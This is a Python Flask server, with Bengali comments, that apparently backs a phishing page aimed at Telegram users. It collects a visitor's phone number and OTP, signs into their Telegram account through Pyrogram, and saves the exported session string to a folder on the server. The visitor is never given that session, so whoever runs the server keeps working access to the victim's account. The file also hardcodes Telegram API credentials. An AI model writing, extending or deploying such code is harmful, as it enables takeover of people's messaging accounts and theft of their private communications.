import os
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneNumberInvalid

app = Flask(__name__)
CORS(app)

API_ID = 33511945
API_HASH = "d044392a17690c14ee5b4a23651a0700"

# অস্থায়ী মেমোরিতে ক্লায়েন্ট ও ফোন হ্যাশ স্টোর করার জন্য ডিকশনারি
temp_clients = {}

@app.route('/', methods=['GET'])
def home():
    try:
        return send_file('index.html')
    except Exception:
        return "index.html not found", 404

@app.route('/verify', methods=['GET'])
def verify_page():
    try:
        return send_file('verify.html')
    except Exception:
        return "verify.html not found", 404

# ধাপ ১: ফোন নম্বর রিসিভ করে টেলিগ্রাম থেকে ওটিপি কোড পাঠানো
@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        # ইউনিক সেশন নেম বা আইডি তৈরি
        session_name = f"session_{phone.replace('+', '')}"
        client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        
        client.connect()
        sent_code = client.send_code(phone)
        
        # ক্লায়েন্ট এবং ফোন কোড হাশ সেভ করে রাখা
        temp_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        
        return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

# ধাপ ২: ওটিপি কোড ভেরিফাই করে .session ফাইল জেনারেট করা
@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400

    if phone not in temp_clients:
        return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400

    user_data = temp_clients[phone]
    client = user_data["client"]
    phone_code_hash = user_data["phone_code_hash"]

    try:
        # টেলিগ্রামে সাইন ইন করা
        client.sign_in(phone, phone_code_hash, code)
        
        # সফল হলে সেশন স্ট্রিং বা ফাইল সেভ করা (সার্ভারে ফাইলে সেভ হবে)
        session_string = client.export_session_string()
        session_filename = f"sessions/{phone.replace('+', '')}.session"
        
        os.makedirs("sessions", exist_ok=True)
        with open(session_filename, "w") as f:
            f.write(session_string)
            
        client.disconnect()
        del temp_clients[phone]
        
        return jsonify({"status": "success", "message": "Session generated successfully!"})
        
    except PhoneCodeInvalid:
        return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
    except SessionPasswordNeeded:
        return jsonify({"status": "success", "message": "2FA Password required (Account is secure)"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
